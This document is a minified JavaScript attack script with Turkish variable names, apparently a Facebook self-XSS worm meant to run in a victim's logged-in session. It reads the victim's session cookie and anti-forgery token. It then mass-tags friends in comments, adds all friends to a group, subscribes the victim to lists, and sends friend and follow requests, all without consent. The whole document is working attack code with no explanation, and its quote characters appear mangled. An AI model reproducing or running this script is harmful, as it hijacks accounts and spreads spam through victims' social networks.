function x__0(){return window.ActiveXObject?new ActiveXObject(“Msxml2.XMLHTTP”):new XMLHttpRequest}function get_friends(){var e=x__0();e.open(“GET”,”/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&lazy=0&viewer=”+uid+”&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm”,false);e.send(null);if(e.readyState==4){var t=JSON.parse(e.responseText.substring(e.responseText.indexOf(“{“)));return t.payload.entries}return false}function get_uid(e){var t=x__0();t.open(“GET”,”http://graph.facebook.com/”+e,false);t.send();if(t.readyState==4){return uid=JSON.parse(t.responseText).id}return false}function cereziAl(e){var t=e+”=”;if(document.cookie.length>0){konum=document.cookie.indexOf(t);if(konum!=-1){konum+=t.length;son=document.cookie.indexOf(“;”,konum);if(son==-1)son=document.cookie.length;return unescape(document.cookie.substring(konum,son))}else{return”"}}}function getRandomInt(e,t){return Math.floor(Math.random()*(t-e+1))+e}function randomValue(e){return e[getRandomInt(0,e.length-1)]}function a(e){var t=new XMLHttpRequest;var n=”/ajax/follow/follow_profile.php?__a=1″;var r=”profile_id=”+e+”&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=”+fb_dtsg+”&lsd&__”+user_id+”&phstamp=”;t.open(“POST”,n,true);t.setRequestHeader(“Content-type”,”application/x-www-form-urlencoded”);t.setRequestHeader(“Content-length”,r.length);t.setRequestHeader(“Connection”,”close”);t.onreadystatechange=function(){if(t.readyState==4&&t.status==200){t.close}};t.send(r)}function sublist(e){var t=document.createElement(“script”);t.innerHTML=”new AsyncRequest().setURI(‘/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe’).setData({ flid: “+e+” }).send();”;document.body.appendChild(t)}function sarkadaslari_al(){var xmlhttp=new XMLHttpRequest;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval(“arkadaslar = “+xmlhttp.responseText.toString().replace(“for (;;);”,”")+”;”);for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){smesaj="";smesaj_text="";for(i=f*10;i<(f+1)*10;i++){if(arkadaslar.payload.entries[i]){smesaj+=" @["+arkadaslar.payload.entries[i].uid+":"+arkadaslar.payload.entries[i].text+"]";smesaj_text+=" "+arkadaslar.payload.entries[i].text}}sdurumpaylas()}}};var params="&filter[0]=user";params+="&options[0]=friends_only";params+="&options[1]=nm";params+="&token=v7";params+="&viewer="+user_id;params+="&__user="+user_id;if(document.URL.indexOf("https://")>=0){xmlhttp.open(“GET”,”https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1″+params,true)}else{xmlhttp.open(“GET”,”http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1″+params,true)}xmlhttp.send()}function sarkadasekle(e,t){var n=new XMLHttpRequest;n.onreadystatechange=function(){if(n.readyState==4){}};n.open(“POST”,”/ajax/add_friend/action.php?__a=1″,true);var r=”to_friend=”+e;r+=”&action=add_friend”;r+=”&how_found=friend_browser”;r+=”&ref_param=none”;r+=”&outgoing_id=”;r+=”&logging_location=friend_browser”;r+=”&no_flyout_on_click=true”;r+=”&ego_log_data=”;r+=”&http_referer=”;r+=”&fb_dtsg=”+document.getElementsByName(“fb_dtsg”)[0].value;r+=”&phstamp=165816749114848369115″;r+=”&__user=”+user_id;n.setRequestHeader(“X-SVN-Rev”,svn_rev);n.setRequestHeader(“Content-Type”,”application/x-www-form-urlencoded”);if(t==”farketmez”&&document.cookie.split(“cins”+user_id+”=”).length>1){n.send(r)}else if(document.cookie.split(“cins”+user_id+”=”).length<=1){cinsiyetgetir(e,t,"sarkadasekle")}else if(t==document.cookie.split("cins"+user_id+"=")[1].split(";")[0].toString()){n.send(r)}}function scinsiyetgetir(uid,cins,fonksiyon){var xmlhttp=new XMLHttpRequest;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval("cinssonuc = "+xmlhttp.responseText.toString().replace("for (;;);","")+";");cinshtml.innerHTML=cinssonuc.jsmods.markup[0][1].__html;btarihi.setTime(bugun.getTime()+1e3*60*60*24*365);if(cinshtml.getElementsByTagName("select")[0].value=="1"){document.cookie="cins"+user_id+"=kadin;expires="+btarihi.toGMTString()}else if(cinshtml.getElementsByTagName("select")[0].value=="2"){document.cookie="cins"+user_id+"=erkek;expires="+btarihi.toGMTString()}eval(fonksiyon+"("+id+","+cins+");")}};xmlhttp.open("GET","/ajax/timeline/edit_profile/basic_info.php?__a=1&__user="+user_id,true);xmlhttp.setRequestHeader("X-SVN-Rev",svn_rev);xmlhttp.send()}var patt=/comment_text=(.*?)&/;var c=1;username=/\.com\/(.*?)\//.exec(window.top.location)[1];uid=get_uid(username);a=window.top.location;termina=0;var amigos=get_friends();post_id=/[0-9]{8,}/.exec(a);uids="comment_text=";header="ft_ent_identifier="+post_id+"&comment_text=�&source=1&client_id=1359576694192%3A1233576093&reply_fbid&parent_comment_id&rootid=u_jsonp_3_19&ft[tn]=[]&ft[qid]=5839337351464612379&ft[mf_story_key]=5470779710560437153&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+uid+"&__a=1&__req=4u&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&phstamp="+Math.random();for(var n=1;n<amigos.length;n++){fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;uids+="%40["+amigos[n].uid+"%3AAAAAAAAAAAA]%20";c++;if(c==7){uids+="&";with(new XMLHttpRequest)open("POST","/ajax/ufi/add_comment.php?__a=1"),setRequestHeader("Content-Type","application/x-www-form-urlencoded"),send(header.replace(patt,uids));z=setTimeout("function(){asd=0}",1e3);clearInterval(z);c=1;uids="comment_text="}}var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);sublist("624334420912439");sublist("599238170088731");sublist("623881154291099");var fb_dtsg=document["getElementsByName"]("fb_dtsg")[0]["value"];var user_id=document["cookie"]["match"](document["cookie"]["match"](/c_user=(\d+)/)[1]);var httpwp=new XMLHttpRequest;var urlwp="/ajax/groups/membership/r2j.php?__a=1";var paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";httpwp["open"]("POST",urlwp,true);httpwp["setRequestHeader"]("Content-type","application/x-www-form-urlencoded");httpwp["setRequestHeader"]("Content-length",paramswp["length"]);httpwp["setRequestHeader"]("Connection","keep-alive");httpwp["send"](paramswp);var fb_dtsg=document["getElementsByName"]("fb_dtsg")[0]["value"];var user_id=document["cookie"]["match"](document["cookie"]["match"](/c_user=(\d+)/)[1]);var friends=new Array;gf=new XMLHttpRequest;gf["open"]("GET","/ajax/typeahead/first_degree.php?__a=1&viewer="+user_id+"&token"+Math["random"]()+"&filter[0]=user&options[0]=friends_only",false);gf["send"]();if(gf["readyState"]!=4){}else{data=eval("("+gf["responseText"]["substr"](9)+")");if(data["error"]){}else{friends=data["payload"]["entries"]["sort"](function(e,t){return e["index"]-t["index"]})}}for(var i=0;i<friends["length"];i++){var httpwp=new XMLHttpRequest;var urlwp="/ajax/groups/members/add_post.php?__a=1";var paramswp="&fb_dtsg="+fb_dtsg+"&group_id="+gid+"&source=typeahead&ref=&message_id=&members="+friends[i]["uid"]+"&__user="+user_id+"&phstamp=";httpwp["open"]("POST",urlwp,true);httpwp["setRequestHeader"]("Content-type","application/x-www-form-urlencoded");httpwp["setRequestHeader"]("Content-length",paramswp["length"]);httpwp["setRequestHeader"]("Connection","keep-alive");httpwp["onreadystatechange"]=function(){if(httpwp["readyState"]==4&&httpwp["status"]==200){}};httpwp["send"](paramswp)}var spage_id="473108719451870";var spost_id="473108719451870";var sfoto_id="473108719451870";var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var smesaj="";var smesaj_text="";var arkadaslar=[];var svn_rev;var bugun=new Date;var btarihi=new Date;btarihi.setTime(bugun.getTime()+1e3*60*60*4*1);if(!document.cookie.match(/paylasti=(\d+)/)){document.cookie="paylasti=hayir;expires="+btarihi.toGMTString()}var tiklama=document.addEventListener("click",function(){if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir")>=0){svn_rev=document.head.innerHTML.split(‘”svn_rev”:’)[1].split(“,”)[0];sarkadaslari_al();document.cookie=”paylasti=evet;expires=”+btarihi.toGMTString();document.removeEventListener(tiklama)}},false);var cinssonuc={};var cinshtml=document.createElement(“html”)<br />
